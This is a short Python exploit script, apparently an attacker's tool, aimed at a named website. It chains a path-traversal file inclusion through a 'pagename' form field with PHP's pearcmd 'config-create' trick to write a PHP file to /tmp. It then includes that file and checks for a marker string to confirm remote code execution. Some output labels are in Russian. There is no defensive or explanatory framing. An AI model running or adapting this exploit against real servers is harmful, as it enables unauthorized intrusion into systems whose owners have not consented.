from core import vuln

h = "mirk154.ru"
base = "https://" + h
CT = "application/x-www-form-urlencoded"
pid = vuln._find_page(base)
print("page_id:", pid)
payload = "<?=" + vuln._chrlit("PBLRCETEST") + "?>"
out = "/tmp/pblx1"
inc = "/usr/local/lib/php/pearcmd"
incp = "templates/" + "../" * 4 + inc.lstrip("/")
outp = "templates/" + "../" * 4 + out.lstrip("/")

r1 = vuln._req("POST", base + "/?+config-create+/" + payload + "+" + out + ".php",
               body=("page_id=%d&pagename=%s" % (pid, vuln._denc(incp))).encode(), ctype=CT)
t1 = r1.text or ""
print("stage1:", r1.status_code, len(t1), "pear:", "PEAR" in t1 or "Commands:" in t1)
i = t1.find("Commands:")
print("  фрагмент:", repr(t1[max(0, i - 80):i + 200]) if i > 0 else "нет Commands:")

r2 = vuln._req("POST", base + "/",
               body=("page_id=%d&pagename=%s" % (pid, vuln._denc(outp))).encode(), ctype=CT)
t2 = r2.text or ""
print("stage2:", r2.status_code, len(t2), "маркер:", "PBLRCETEST" in t2)